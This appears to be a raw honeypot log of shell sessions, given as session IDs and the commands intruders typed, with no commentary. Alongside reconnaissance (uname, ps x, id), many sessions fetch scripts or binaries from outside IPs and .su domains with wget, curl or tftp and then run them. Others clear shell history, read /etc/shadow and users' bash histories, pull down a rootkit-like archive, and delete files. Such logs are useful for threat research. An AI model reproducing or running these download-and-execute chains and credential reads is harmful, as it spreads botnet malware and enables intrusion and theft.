c5a456419c26491da743aae6fcbb3a81	uname
c5a456419c26491da743aae6fcbb3a81	free -m
c5a456419c26491da743aae6fcbb3a81	ps x
dbaab159d7734aa09dd99ea8e956f2ee	uname
dbaab159d7734aa09dd99ea8e956f2ee	free -m
dbaab159d7734aa09dd99ea8e956f2ee	ps x
e67c82fbb81b4aceaeda53ce1ad48dc7	uname
e67c82fbb81b4aceaeda53ce1ad48dc7	free -m
e67c82fbb81b4aceaeda53ce1ad48dc7	ps x
8a954aaba85b4e6cae06291461d14ebb	uname
8a954aaba85b4e6cae06291461d14ebb	free -m
8a954aaba85b4e6cae06291461d14ebb	ps x
ac63fafbd321477e85e0ab5eaa2f6543	uname
ac63fafbd321477e85e0ab5eaa2f6543	free -m
ac63fafbd321477e85e0ab5eaa2f6543	ps x
83603f34395c4669a5d64c8557c085f4	wget http://185.17.30.239/gb.sh -O /dev/gb.sh
7df5f54f0afc465bb4941527add8d606	uname
7df5f54f0afc465bb4941527add8d606	free -m
7df5f54f0afc465bb4941527add8d606	ps x
ceaccffc5e12408ba88ad0fea0854666	uname
ceaccffc5e12408ba88ad0fea0854666	free -m
ceaccffc5e12408ba88ad0fea0854666	ps x
66d3c0ad898d4ceb91c8c148bb6ee4a0	uname
66d3c0ad898d4ceb91c8c148bb6ee4a0	free -m
66d3c0ad898d4ceb91c8c148bb6ee4a0	ps x
d336b8294a9b4f2b9e6662955a28070f	uname
d336b8294a9b4f2b9e6662955a28070f	free -m
d336b8294a9b4f2b9e6662955a28070f	ps x
4135a53fd68e409c8685f70caefca463	uname
4135a53fd68e409c8685f70caefca463	free -m
4135a53fd68e409c8685f70caefca463	ps x
666e8ec745e24cebb8204f5e81b3ee1b	uname
666e8ec745e24cebb8204f5e81b3ee1b	free -m
666e8ec745e24cebb8204f5e81b3ee1b	ps x
20c5547132df4d9c82477f7b13f13c66	uname
20c5547132df4d9c82477f7b13f13c66	free -m
20c5547132df4d9c82477f7b13f13c66	ps x
b6f58f3a7792413f8e6fd834dbb58d3a	uname
b6f58f3a7792413f8e6fd834dbb58d3a	free -m
b6f58f3a7792413f8e6fd834dbb58d3a	ps x
6bf824f6960d452e8a112ae9656a2a4a	uname
6bf824f6960d452e8a112ae9656a2a4a	free -m
6bf824f6960d452e8a112ae9656a2a4a	ps x
c4766f16b2174041ab234a342910d8e0	uname
c4766f16b2174041ab234a342910d8e0	free -m
c4766f16b2174041ab234a342910d8e0	ps x
2c556bba27ea44fb94e6ed419a16c2ce	uname
2c556bba27ea44fb94e6ed419a16c2ce	free -m
2c556bba27ea44fb94e6ed419a16c2ce	ps x
7fa51791a9b04507b2d8b1af42d408d0	uname
7fa51791a9b04507b2d8b1af42d408d0	free -m
7fa51791a9b04507b2d8b1af42d408d0	ps x
404c4411b7434b59bbad0ea96a9e7ee0	uname
404c4411b7434b59bbad0ea96a9e7ee0	free -m
404c4411b7434b59bbad0ea96a9e7ee0	ps x
b1767314b25549c191e63d44d9f236fd	uname
b1767314b25549c191e63d44d9f236fd	free -m
b1767314b25549c191e63d44d9f236fd	ps x
5e877b6becba4f409bf653dbe5bfd854	uname
5e877b6becba4f409bf653dbe5bfd854	free -m
5e877b6becba4f409bf653dbe5bfd854	ps x
ae0fa418ba784c80aeaec8e3592a5785	cd /tmp
ae0fa418ba784c80aeaec8e3592a5785	wget http://45.32.232.197/get.sh --quiet
9861fce4c9bf443eb22c551fc94792f9	uname
9861fce4c9bf443eb22c551fc94792f9	free -m
9861fce4c9bf443eb22c551fc94792f9	ps x
07f52fdc986545038c47d9dba212bdd9	uname
07f52fdc986545038c47d9dba212bdd9	free -m
07f52fdc986545038c47d9dba212bdd9	ps x
bbaaa5b652ed4b6182e81f17dd3d98c9	uname
bbaaa5b652ed4b6182e81f17dd3d98c9	free -m
bbaaa5b652ed4b6182e81f17dd3d98c9	ps x
63c6f43606604734aac05115449c5557	uname
63c6f43606604734aac05115449c5557	free -m
63c6f43606604734aac05115449c5557	ps x
8acce03c621e40f7a62577f1434d6dcd	uname
8acce03c621e40f7a62577f1434d6dcd	free -m
8acce03c621e40f7a62577f1434d6dcd	ps x
9a88ccfcf71048c58cdf7fbe2bb31dcc	uname
9a88ccfcf71048c58cdf7fbe2bb31dcc	free -m
9a88ccfcf71048c58cdf7fbe2bb31dcc	ps x
6e83338ab2cd43fa952b927f2c2dfa9a	uname
6e83338ab2cd43fa952b927f2c2dfa9a	free -m
6e83338ab2cd43fa952b927f2c2dfa9a	ps x
7b02c10ead67489cb00e5e77dddc14af	uname
7b02c10ead67489cb00e5e77dddc14af	free -m
7b02c10ead67489cb00e5e77dddc14af	ps x
1c27463c5c6c4326b148aeb817bcf67a	uname
1c27463c5c6c4326b148aeb817bcf67a	free -m
1c27463c5c6c4326b148aeb817bcf67a	ps x
53206816322f49a5aeef94b638b9a702	cd /tmp
53206816322f49a5aeef94b638b9a702	wget http://185.130.5.246/bin3.sh --quiet
6db5b2e7751c46b995ff6395dc69edd4	cd /tmp
6db5b2e7751c46b995ff6395dc69edd4	wget http://45.32.232.197/lol/conf.sh --quiet
d0f00c0e953040d3bb7adae470bc15e8	cd /tmp
d0f00c0e953040d3bb7adae470bc15e8	wget http://45.32.232.197/get.sh --quiet
400ea0f2d85946c9837a4d1ac9e418be	cd /tmp
400ea0f2d85946c9837a4d1ac9e418be	wget http://185.130.5.246/bin.sh
4f4c9bf206ad4787a2e209d8caf6c811	tftp -r t.sh -g 185.130.5.246
4f4c9bf206ad4787a2e209d8caf6c811	sh t.sh
4f4c9bf206ad4787a2e209d8caf6c811	tftp 185.130.5.246 -c get t2.sh
4f4c9bf206ad4787a2e209d8caf6c811	sh t2.sh
e9d22914424e4a16b6a6c09fa6075493	cd /tmp
e9d22914424e4a16b6a6c09fa6075493	wget http://185.130.5.246/bin.sh
c5791fc364174a649d0f4164d560ff54	tftp -r t.sh -g 185.130.5.246
c5791fc364174a649d0f4164d560ff54	sh t.sh
c5791fc364174a649d0f4164d560ff54	tftp 185.130.5.246 -c get t2.sh
c5791fc364174a649d0f4164d560ff54	sh t2.sh
3a3291589048427492fd16a2d98fb0df	uname
3a3291589048427492fd16a2d98fb0df	free -m
3a3291589048427492fd16a2d98fb0df	ps x
52cd6dbe30514eabb13e564e876e9f7a	uname
52cd6dbe30514eabb13e564e876e9f7a	free -m
52cd6dbe30514eabb13e564e876e9f7a	ps x
93dfb850a58e4646955ace0d60bdeee0	cd /tmp
93dfb850a58e4646955ace0d60bdeee0	wget http://185.130.5.246/bin.sh
0ccd90774da24ad7b6c2855d49a27e98	tftp -r t.sh -g 185.130.5.246
0ccd90774da24ad7b6c2855d49a27e98	sh t.sh
0ccd90774da24ad7b6c2855d49a27e98	tftp 185.130.5.246 -c get t2.sh
0ccd90774da24ad7b6c2855d49a27e98	sh t2.sh
638017d117724dd1a76a8350a2bc7df4	uname
638017d117724dd1a76a8350a2bc7df4	free -m
638017d117724dd1a76a8350a2bc7df4	ps x
52233c871ee94fde82fd8005d77b8c27	uname
52233c871ee94fde82fd8005d77b8c27	free -m
52233c871ee94fde82fd8005d77b8c27	ps x
9a2c3574f0f249c2ab6d6b2a89a392e5	uname
9a2c3574f0f249c2ab6d6b2a89a392e5	free -m
806258164760495db2dfa6c20f1f8265	uname
9a2c3574f0f249c2ab6d6b2a89a392e5	ps x
806258164760495db2dfa6c20f1f8265	free -m
806258164760495db2dfa6c20f1f8265	ps x
a20f855153284d19806464e767c12926	uname
a20f855153284d19806464e767c12926	free -m
a20f855153284d19806464e767c12926	ps x
1468369816fc4ac79655a371bfed152c	uname
1468369816fc4ac79655a371bfed152c	free -m
1468369816fc4ac79655a371bfed152c	ps x
f6bed45756a24c49a95c504f1e8be2bd	uname
f6bed45756a24c49a95c504f1e8be2bd	free -m
f6bed45756a24c49a95c504f1e8be2bd	ps x
4fee93935bf44739af17bd340c9dec1e	uname
4fee93935bf44739af17bd340c9dec1e	free -m
4fee93935bf44739af17bd340c9dec1e	ps x
8b005400800a4136a62492877686e686	uname
8b005400800a4136a62492877686e686	free -m
8b005400800a4136a62492877686e686	ps x
ceaa401b882746adb56547b0ac936ecd	uname
ceaa401b882746adb56547b0ac936ecd	free -m
ceaa401b882746adb56547b0ac936ecd	ps x
ddaf5320321a42ef9ef58a47d212c3ff	uname
ddaf5320321a42ef9ef58a47d212c3ff	free -m
ddaf5320321a42ef9ef58a47d212c3ff	ps x
72bc7bcade4e42d293098b8fb7ca8164	curl -o /tmp/25002 http://23.234.25.140:15826/25002
72bc7bcade4e42d293098b8fb7ca8164	/tmp/25002
62364b90de614808ab20fc5e96908ae2	wget http://185.17.30.239/gb.sh -O /dev/gb.sh
4192b2f40bab41f7b20bd13755cd46e0	wget http://185.17.30.239/gb.sh -O /dev/gb.sh
737e14f41f424456ba1b06f05adfc0e3	curl -o /tmp/25002 http://23.234.25.140:15826/25002
7074523f17364ad695c23308d9cc3917	curl -o /tmp/25002 http://23.234.25.140:15826/25002
07845a826eff42f5bf81973ad3db810c	curl -o /tmp/25002 http://23.234.25.140:15826/25002
07845a826eff42f5bf81973ad3db810c	chmod 777 /tmp/25002
07845a826eff42f5bf81973ad3db810c	/tmp/25002
ce4965df70b243d98d2ecbf3139e3b09	curl -o /tmp/25002 http://23.234.25.140:15826/25002
ce4965df70b243d98d2ecbf3139e3b09	chmod 777 /tmp/25002
ce4965df70b243d98d2ecbf3139e3b09	/tmp/25002
4022586e15dc4f0c93cad38c3e1c6763	cd /tmp
4022586e15dc4f0c93cad38c3e1c6763	wget http://208.67.1.142/ddos.pl
c6e225c87ea94ff9bc011f589703d997	curl -o /tmp/25002 http://23.234.25.140:15826/25002
888bbe3baa7b4b4895ff27e8fe06c9c3	wget http://185.17.30.239/gb.sh -O /dev/gb.sh
a4f7dd0fb19a45aa83d562def40c6eb0	curl -o /tmp/25002 http://23.234.25.140:15826/25002
a4f7dd0fb19a45aa83d562def40c6eb0	chmod 777 /tmp/25002
a4f7dd0fb19a45aa83d562def40c6eb0	/tmp/25002
72f75f1e1fed4b5195f3ddf89d9d42b6	w
72f75f1e1fed4b5195f3ddf89d9d42b6	ls -a
72f75f1e1fed4b5195f3ddf89d9d42b6	cd /dev/shm
72f75f1e1fed4b5195f3ddf89d9d42b6	ls -a
72f75f1e1fed4b5195f3ddf89d9d42b6	wget
72f75f1e1fed4b5195f3ddf89d9d42b6	wget prg.do.am/new/prgssh.tgz
72f75f1e1fed4b5195f3ddf89d9d42b6	tar xzvf prgssh.tgz
72f75f1e1fed4b5195f3ddf89d9d42b6	cd prgssh
72f75f1e1fed4b5195f3ddf89d9d42b6	ls
72f75f1e1fed4b5195f3ddf89d9d42b6	./a
72f75f1e1fed4b5195f3ddf89d9d42b6	./go
72f75f1e1fed4b5195f3ddf89d9d42b6	./gob
72f75f1e1fed4b5195f3ddf89d9d42b6	./a
72f75f1e1fed4b5195f3ddf89d9d42b6	./a 5.90
72f75f1e1fed4b5195f3ddf89d9d42b6	cd ..
72f75f1e1fed4b5195f3ddf89d9d42b6	ls
72f75f1e1fed4b5195f3ddf89d9d42b6	rm -rf *
72f75f1e1fed4b5195f3ddf89d9d42b6	exit
c1f98cc55f5f490f8285621a93a58516	wget http://185.17.30.239/gb.sh -O /dev/gb.sh
f7cfd8a3c4de412197817d52cb991b10	wget http://185.17.30.239/gb.sh -O /dev/gb.sh
5424c67f6c2d473da42d2b2d9b7635e8	wget http://185.17.30.239/gb.sh -O /dev/gb.sh
b2261fe3c74440c0ad23daf1c111914d	cd /tmp
b2261fe3c74440c0ad23daf1c111914d	wget ftp://188.0.236.27/pub/un.pl
b2261fe3c74440c0ad23daf1c111914d	perl un.pl
b2261fe3c74440c0ad23daf1c111914d	rm -rf un.pl
0aa62a6da16344928792a4792473f6d0	wget http://185.17.30.239/gb.sh -O /dev/gb.sh
b33c0d53e89d444c8da6970c5a76da8c	curl -o /tmp/25002 http://23.234.25.140:15826/25002
148e1ccce7614daab1553858a553d5e3	curl -o /tmp/25002 http://23.234.25.140:15826/25002
148e1ccce7614daab1553858a553d5e3	chmod 777 /tmp/25002
148e1ccce7614daab1553858a553d5e3	/tmp/25002
b50bcf7c280847c18a55f757b663b444	cd /tmp
b50bcf7c280847c18a55f757b663b444	wget ftp://188.0.236.27/pub/un.pl
b50bcf7c280847c18a55f757b663b444	perl un.pl
b50bcf7c280847c18a55f757b663b444	rm -rf un.pl
8de9fe92b4374786b06107bcb83de9ad	curl -o /tmp/25002 http://23.234.25.140:15826/25002
8de9fe92b4374786b06107bcb83de9ad	chmod 777 /tmp/25002
8de9fe92b4374786b06107bcb83de9ad	/tmp/25002
aa83a9b9c57a4da8bb136c83486f20d3	cd /tmp  |  |  cd /var/run  |  |  cd /dev/shm  |  |  cd /mnt  |  |  cd /var
aa83a9b9c57a4da8bb136c83486f20d3	tftp -r tftp.sh -g 89.248.162.167
aa83a9b9c57a4da8bb136c83486f20d3	sh tftp.sh
aa83a9b9c57a4da8bb136c83486f20d3	wget http://89.248.162.167/bin.sh
8ea46b31744e4dc18b6559ac6b023e03	cd /tmp
8ea46b31744e4dc18b6559ac6b023e03	busybox wget http://89.248.162.167/ubnt.sh
8ea46b31744e4dc18b6559ac6b023e03	sh ubnt.sh
8ea46b31744e4dc18b6559ac6b023e03	busybox tftp -r ubnt.sh -g 89.248.162.167
8ea46b31744e4dc18b6559ac6b023e03	sh ubnt.sh
8ea46b31744e4dc18b6559ac6b023e03	cd /dev
8ea46b31744e4dc18b6559ac6b023e03	busybox wget http://89.248.162.167/ubnt.sh
8ea46b31744e4dc18b6559ac6b023e03	sh ubnt.sh busybox tftp -r ubnt.sh -g 89.248.162.167
8ea46b31744e4dc18b6559ac6b023e03	sh ubnt.sh
1699ae1a52ef4d46802817ce6e0365c4	cd /tmp  |  |  cd /var/run
1699ae1a52ef4d46802817ce6e0365c4	wget http://185.130.5.179/r2/r2.sh -O .fx.sh
5a6d02a28d01487dbb05faeaf512a04c	curl -o /tmp/25002 http://23.234.25.140:15826/25002
5a6d02a28d01487dbb05faeaf512a04c	/tmp/25002
ba76a55d14d9408c956867b30209154c	curl -o /tmp/25002 http://23.234.25.140:15826/25002
ba76a55d14d9408c956867b30209154c	chmod 777 /tmp/25002
ba76a55d14d9408c956867b30209154c	/tmp/25002
2dcd69838b69461e8e2ac3ae9af5f4b4	bash
42a364269bb64276a0d63997d816d65d	cd /tmp  |  |  cd /mnt  |  |  cd /var
42a364269bb64276a0d63997d816d65d	wget http://89.248.162.167/bin.sh
44714d88e9f2478dbc1c58cb5acbb723	cd /tmp  |  |  cd /mnt  |  |  cd /var
44714d88e9f2478dbc1c58cb5acbb723	wget http://89.248.162.167/gay.sh
26be2dad6f0e44b89db913a99b520f32	cd /tmp  |  |  cd /mnt  |  |  cd /var
26be2dad6f0e44b89db913a99b520f32	wget http://89.248.162.167/bin.sh
4c02b32e32ca44619ebf81d726aaee8a	cd /tmp
4c02b32e32ca44619ebf81d726aaee8a	wget http://131.72.136.243/getbinaries.sh
b8340c6e7cc745e1984ad38e4433f9e0	cd /tmp  |  |  cd /mnt  |  |  cd /var
b8340c6e7cc745e1984ad38e4433f9e0	wget http://89.248.162.167/bin.sh
cd69ddff9ae043bcbaefe9a2fc8e6f62	cd /tmp  |  |  cd /mnt  |  |  cd /var
cd69ddff9ae043bcbaefe9a2fc8e6f62	wget http://89.248.162.167/gay.sh
c2de3fb273d8499aa9f336a7e3101d6c	id
e42a05f4cff841c99c314037d4581cc1	cd /tmp  |  |  cd /mnt  |  |  cd /var
e42a05f4cff841c99c314037d4581cc1	wget http://89.248.162.167/bin.sh
963f44a118ba49748f5850a49d0b558e	cd /tmp
963f44a118ba49748f5850a49d0b558e	wget ftp://188.0.236.27/pub/un.pl
963f44a118ba49748f5850a49d0b558e	perl un.pl
963f44a118ba49748f5850a49d0b558e	rm -rf un.pl
95b54fe8db28488dabae878cc1eff5eb	uname -a
95b54fe8db28488dabae878cc1eff5eb	cat /proc/version
95b54fe8db28488dabae878cc1eff5eb	exit
9539ff18bdaa4f34beaca02d21175251	exit
26b48e8acdbf4e0da7eacedfbfccdbbc	unset HISTFILE
26b48e8acdbf4e0da7eacedfbfccdbbc	unset HISTSAVE
26b48e8acdbf4e0da7eacedfbfccdbbc	w
26b48e8acdbf4e0da7eacedfbfccdbbc	cat /etc/*release
26b48e8acdbf4e0da7eacedfbfccdbbc	uname -a
26b48e8acdbf4e0da7eacedfbfccdbbc	ps x
26b48e8acdbf4e0da7eacedfbfccdbbc	whoami
26b48e8acdbf4e0da7eacedfbfccdbbc	id
26b48e8acdbf4e0da7eacedfbfccdbbc	last -5
26b48e8acdbf4e0da7eacedfbfccdbbc	cat /root/.bash_history
26b48e8acdbf4e0da7eacedfbfccdbbc	dir -al /root/
26b48e8acdbf4e0da7eacedfbfccdbbc	netstat -plunta
26b48e8acdbf4e0da7eacedfbfccdbbc	cat /etc/shadow
26b48e8acdbf4e0da7eacedfbfccdbbc	cat /etc/passwd
26b48e8acdbf4e0da7eacedfbfccdbbc	cat /home/richard/.bash_history
26b48e8acdbf4e0da7eacedfbfccdbbc	dir -al /home/richard/
26b48e8acdbf4e0da7eacedfbfccdbbc	ps x
26b48e8acdbf4e0da7eacedfbfccdbbc	w
7716287c99474fa8a49c3fe66cec0095	exit
26b48e8acdbf4e0da7eacedfbfccdbbc	w
26b48e8acdbf4e0da7eacedfbfccdbbc	dir -al /etc/ssh
26b48e8acdbf4e0da7eacedfbfccdbbc	php -v
26b48e8acdbf4e0da7eacedfbfccdbbc	uname -a
26b48e8acdbf4e0da7eacedfbfccdbbc	cd /tmp
26b48e8acdbf4e0da7eacedfbfccdbbc	mkdir bla
26b48e8acdbf4e0da7eacedfbfccdbbc	cd bla
26b48e8acdbf4e0da7eacedfbfccdbbc	wget https://www.drivehq.com/file/DFPublishFile.aspx/FileID3046212748/Keyau2gpe02yx1k/rktest.tgz
26b48e8acdbf4e0da7eacedfbfccdbbc	tar zxvf rktest.tgz
26b48e8acdbf4e0da7eacedfbfccdbbc	cd rktest
26b48e8acdbf4e0da7eacedfbfccdbbc	./check
26b48e8acdbf4e0da7eacedfbfccdbbc	apt-get install libgnomeui32
26b48e8acdbf4e0da7eacedfbfccdbbc	./check
26b48e8acdbf4e0da7eacedfbfccdbbc	find / -name libgnome.so.32
26b48e8acdbf4e0da7eacedfbfccdbbc	locate libgnome.so.32
26b48e8acdbf4e0da7eacedfbfccdbbc	whoami
26b48e8acdbf4e0da7eacedfbfccdbbc	/usr/sbin/find / -name libgnome.so.32
26b48e8acdbf4e0da7eacedfbfccdbbc	apt-get install find
26b48e8acdbf4e0da7eacedfbfccdbbc	find
26b48e8acdbf4e0da7eacedfbfccdbbc	find / -name libgnome.so.32
26b48e8acdbf4e0da7eacedfbfccdbbc	./chek
26b48e8acdbf4e0da7eacedfbfccdbbc	./check
26b48e8acdbf4e0da7eacedfbfccdbbc	ps x
26b48e8acdbf4e0da7eacedfbfccdbbc	dir -al
26b48e8acdbf4e0da7eacedfbfccdbbc	pico a
26b48e8acdbf4e0da7eacedfbfccdbbc	apt-get update
26b48e8acdbf4e0da7eacedfbfccdbbc	su
26b48e8acdbf4e0da7eacedfbfccdbbc	apt-get update
26b48e8acdbf4e0da7eacedfbfccdbbc	apt-get remove find
26b48e8acdbf4e0da7eacedfbfccdbbc	w
26b48e8acdbf4e0da7eacedfbfccdbbc	apt-get install find
3904bf4efb644af9b69dc02e8bbdfb6a	unset HISTFILE
3904bf4efb644af9b69dc02e8bbdfb6a	unset HISTSAVE
3904bf4efb644af9b69dc02e8bbdfb6a	find
3904bf4efb644af9b69dc02e8bbdfb6a	apt-get install find
3904bf4efb644af9b69dc02e8bbdfb6a	find
3904bf4efb644af9b69dc02e8bbdfb6a	ps x
3904bf4efb644af9b69dc02e8bbdfb6a	dir -al /tmp
3904bf4efb644af9b69dc02e8bbdfb6a	mkdir bla
92e109100e584d3d9131848ab50ea0dc	dir -al /tmp
92e109100e584d3d9131848ab50ea0dc	exit
3904bf4efb644af9b69dc02e8bbdfb6a	exit
881e083027454af3a02cac2fde2f3912	cd /tmp
881e083027454af3a02cac2fde2f3912	wget ftp://188.0.236.27/pub/un.pl
881e083027454af3a02cac2fde2f3912	perl un.pl
881e083027454af3a02cac2fde2f3912	rm -rf un.pl
e9cd86b9555346e38b17b3f022f27862	echo "Uname: "`uname -a`
e9cd86b9555346e38b17b3f022f27862	echo "ID: "`id`
0ed8028d560c4e8883fb1672e4770623	cd /tmp  |  |  cd /var/run
0ed8028d560c4e8883fb1672e4770623	rm -rf *
0ed8028d560c4e8883fb1672e4770623	busybox wget http://fxh.updatebits.su/r2/r2.sh  |  |  wget http://fxh.updatebits.su/r2/r2.sh
0ed8028d560c4e8883fb1672e4770623	sh r2.sh
0ed8028d560c4e8883fb1672e4770623	rm -rf r2.sh
0ed8028d560c4e8883fb1672e4770623	busybox tftp -r .r2.sh -g 208.67.1.70  |  |  tftp -r .r2.sh -g fx2.updatebits.su
0ed8028d560c4e8883fb1672e4770623	sh .r2.sh
0ed8028d560c4e8883fb1672e4770623	rm -rf .r2.sh
54bf4038f80a4078872e6efdf5a228fd	cd /tmp  |  |  cd /var/run  |  |  cd /mnt  |  |  cd /dev/shm  |  |  cd /var
54bf4038f80a4078872e6efdf5a228fd	curl -O twh.updatebits.su/r1/curl.sh  >  curl.sh
8fcf49de7dd1414bba8a68d4ba6d914a	LS
8fcf49de7dd1414bba8a68d4ba6d914a	ls
8fcf49de7dd1414bba8a68d4ba6d914a	cd ..
96c02171703e48aca15fd66b015d1998	apt-get update
96c02171703e48aca15fd66b015d1998	apt-get upgrade
96c02171703e48aca15fd66b015d1998	apt-get update
96c02171703e48aca15fd66b015d1998	apt-get upgrade
96c02171703e48aca15fd66b015d1998	apt-get update
96c02171703e48aca15fd66b015d1998	apt-get upgrade
96c02171703e48aca15fd66b015d1998	sudo
96c02171703e48aca15fd66b015d1998	sy
96c02171703e48aca15fd66b015d1998	su
96c02171703e48aca15fd66b015d1998	apt-get update
96c02171703e48aca15fd66b015d1998	apt-get upgrade
96c02171703e48aca15fd66b015d1998	exit
26ab8b2c33354d858434341d6056f48f	apt-get update
26ab8b2c33354d858434341d6056f48f	apt-get upgrade
a523e79180e54189b5660bacd9c033aa	curl -o /tmp/25002 http://23.234.25.140:15826/25002
a523e79180e54189b5660bacd9c033aa	/tmp/25002
127420efe52e44efb082c76be130cf10	curl -o /tmp/25002 http://23.234.25.140:15826/25002
127420efe52e44efb082c76be130cf10	chmod 777 /tmp/25002
127420efe52e44efb082c76be130cf10	/tmp/25002
28f2a69bc3494211a1a75a9d325507fe	curl -o /tmp/25002 http://23.234.25.140:15826/25002
28f2a69bc3494211a1a75a9d325507fe	chmod 777 /tmp/25002
28f2a69bc3494211a1a75a9d325507fe	/tmp/25002
68afc12442334f35b4bb5fec6226e897	cd /tmp
68afc12442334f35b4bb5fec6226e897	wget http://45.32.232.197/get.sh --quiet
5c587bb94f974252b730e4801513033e	cd /tmp  |  |  cd /var/run  |  |  cd /dev/shm  |  |  cd /mnt  |  |  cd /var
5c587bb94f974252b730e4801513033e	wget http://45.32.232.197/bin3.sh
cef41bdf0a4a440fbbf6935859e71674	id
607725136fac438daf6cf7516a0834ec	cd /tmp
607725136fac438daf6cf7516a0834ec	wget http://45.32.232.197/get.sh --quiet
2eb739542c3a4577917d97b5b5694cb2	cd /tmp  |  |  cd /var/run  |  |  cd /dev/shm  |  |  cd /mnt  |  |  cd /var
2eb739542c3a4577917d97b5b5694cb2	wget http://45.32.232.197/bin3.sh
946ad85fc8e4482abc62da5f2bcc4bef	curl -o /tmp/25002 http://23.234.25.140:15826/25002
946ad85fc8e4482abc62da5f2bcc4bef	chmod 777 /tmp/25002
946ad85fc8e4482abc62da5f2bcc4bef	/tmp/25002
8352c71b7ce7429e8eab78104e8e8b6e	curl -o /tmp/25002 http://23.234.25.140:15826/25002
8352c71b7ce7429e8eab78104e8e8b6e	chmod 777 /tmp/25002
8352c71b7ce7429e8eab78104e8e8b6e	/tmp/25002
d3b54e6b72494d02abf18f4471f281d4	curl -o /tmp/25002 http://23.234.25.140:15826/25002
d3b54e6b72494d02abf18f4471f281d4	chmod 777 /tmp/25002
d3b54e6b72494d02abf18f4471f281d4	/tmp/25002
850b7a70dad84fe29d1fd4fd1cf8d88c	curl -o /tmp/25002 http://23.234.25.140:15826/25002
a46526b73187428bbedaa817c72c4b63	cd /tmp
a46526b73187428bbedaa817c72c4b63	wget http://45.32.232.197/bin3.sh --quiet
b77b989412514e8e80435c5b51f91ceb	cd /tmp  |  |  cd /var/run  |  |  cd /dev/shm  |  |  cd /mnt  |  |  cd /var
b77b989412514e8e80435c5b51f91ceb	wget http://45.32.232.197/bin3.sh
e8b78a348b1e418d970bdaa56ff7c9d8	cd /tmp  |  |  cd /var/run
e8b78a348b1e418d970bdaa56ff7c9d8	rm -rf *
e8b78a348b1e418d970bdaa56ff7c9d8	busybox wget http://fxh.updatebits.su/r2/r2.sh  |  |  wget http://fxh.updatebits.su/r2/r2.sh
e8b78a348b1e418d970bdaa56ff7c9d8	sh r2.sh
e8b78a348b1e418d970bdaa56ff7c9d8	rm -rf r2.sh
e8b78a348b1e418d970bdaa56ff7c9d8	busybox tftp -r .r2.sh -g 208.67.1.70  |  |  tftp -r .r2.sh -g fx2.updatebits.su
e8b78a348b1e418d970bdaa56ff7c9d8	sh .r2.sh
e8b78a348b1e418d970bdaa56ff7c9d8	rm -rf .r2.sh
9c1a152122e34eb4a1e403254261a4f4	cd /tmp  |  |  cd /var/run
9c1a152122e34eb4a1e403254261a4f4	rm -rf *
9c1a152122e34eb4a1e403254261a4f4	busybox wget http://mic.updatebits.su/sm/sm.sh  |  |  wget http://mic.updatebits.su/sm/sm.sh
9c1a152122e34eb4a1e403254261a4f4	sh sm.sh
9c1a152122e34eb4a1e403254261a4f4	rm -rf sm.sh
9c1a152122e34eb4a1e403254261a4f4	busybox tftp -r .sm.sh -g 185.117.72.111  |  |  tftp -r .sm.sh -g mic.updatebits.su
9c1a152122e34eb4a1e403254261a4f4	sh .sm.sh
9c1a152122e34eb4a1e403254261a4f4	rm -rf .sm.sh
9871998fcb9a492a9bb3666e7500300a	cd /tmp  |  |  cd /var/run
9871998fcb9a492a9bb3666e7500300a	rm -rf *
9871998fcb9a492a9bb3666e7500300a	busybox wget http://mic.updatebits.su/sm/sm.sh  |  |  wget http://mic.updatebits.su/sm/sm.sh
9871998fcb9a492a9bb3666e7500300a	sh sm.sh
9871998fcb9a492a9bb3666e7500300a	rm -rf sm.sh
9871998fcb9a492a9bb3666e7500300a	busybox tftp -r .sm.sh -g 185.117.72.111  |  |  tftp -r .sm.sh -g mic.updatebits.su
9871998fcb9a492a9bb3666e7500300a	sh .sm.sh
9871998fcb9a492a9bb3666e7500300a	rm -rf .sm.sh
6a018d5854cc4263aa05ce226d7afcbd	cd /tmp
6a018d5854cc4263aa05ce226d7afcbd	wget ftp://188.0.236.27/pub/un.pl
6a018d5854cc4263aa05ce226d7afcbd	perl un.pl
6a018d5854cc4263aa05ce226d7afcbd	rm -rf un.pl
6eda6a8e775440efb334b051ebbb9e63	cd /tmp
6eda6a8e775440efb334b051ebbb9e63	wget http://45.32.232.197/get.sh --quiet
8714ebc82395420a8df6ea711ecc0eda	cd /tmp  |  |  cd /var/run  |  |  cd /dev/shm  |  |  cd /mnt  |  |  cd /var
8714ebc82395420a8df6ea711ecc0eda	wget http://89.248.162.146/bin3.sh
0d91efc8ba1641b6b8efb96d4e3f07d3	cd /tmp
0d91efc8ba1641b6b8efb96d4e3f07d3	wget http://45.32.232.197/get.sh --quiet
